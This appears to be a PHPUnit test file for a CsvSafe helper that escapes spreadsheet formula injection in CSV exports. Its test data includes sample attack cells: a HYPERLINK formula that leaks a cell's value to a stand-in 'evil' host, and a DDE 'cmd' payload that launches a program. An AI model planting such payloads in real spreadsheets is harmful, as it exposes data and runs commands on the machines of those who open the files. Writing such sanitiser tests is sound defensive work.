<?php

namespace Tests\Unit;

use App\Support\CsvSafe;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class CsvSafeTest extends TestCase
{
    /**
     * @return array<string, array{string, string}>
     */
    public static function formulaCells(): array
    {
        return [
            'hyperlink formula' => ['=HYPERLINK("http://evil/?"&A2,"x")', '\'=HYPERLINK("http://evil/?"&A2,"x")'],
            'plus formula' => ['+SUM(1,1)', "'+SUM(1,1)"],
            'minus formula' => ['-2+3+cmd|\' /C calc\'!A0', "'-2+3+cmd|' /C calc'!A0"],
            'at formula' => ['@SUM(A1)', "'@SUM(A1)"],
            'tab prefixed' => ["\t=1+1", "'\t=1+1"],
            'carriage return prefixed' => ["\r=1+1", "'\r=1+1"],
        ];
    }

    #[DataProvider('formulaCells')]
    public function test_formula_like_text_is_prefixed_with_an_apostrophe(string $input, string $expected): void
    {
        $this->assertSame($expected, CsvSafe::cell($input));
    }

    public function test_normal_values_are_left_untouched(): void
    {
        foreach (['Amit Verma', 'O\'Brien', 'a=b', 'Rs. -5 discount', '', '2026-04-05', 'name@example.com', 'Mumbai Indians vs Kolkata Knight Riders'] as $value) {
            $this->assertSame($value, CsvSafe::cell($value));
        }
    }

    public function test_plain_numbers_and_non_strings_stay_numeric(): void
    {
        $this->assertSame('-50.00', CsvSafe::cell('-50.00'));
        $this->assertSame('+919876543210', CsvSafe::cell('+919876543210'));
        $this->assertSame(-5, CsvSafe::cell(-5));
        $this->assertSame(12.5, CsvSafe::cell(12.5));
        $this->assertNull(CsvSafe::cell(null));
        $this->assertTrue(CsvSafe::cell(true));
    }

    public function test_a_number_followed_by_a_formula_is_still_neutralised(): void
    {
        $this->assertSame("'-1+cmd", CsvSafe::cell('-1+cmd'));
        $this->assertSame("'+1=2", CsvSafe::cell('+1=2'));
    }

    public function test_row_sanitises_every_cell_and_keeps_keys(): void
    {
        $this->assertSame(
            ['REG-1', "'=cmd", 'Amit', 42],
            CsvSafe::row(['REG-1', '=cmd', 'Amit', 42]),
        );
    }
}
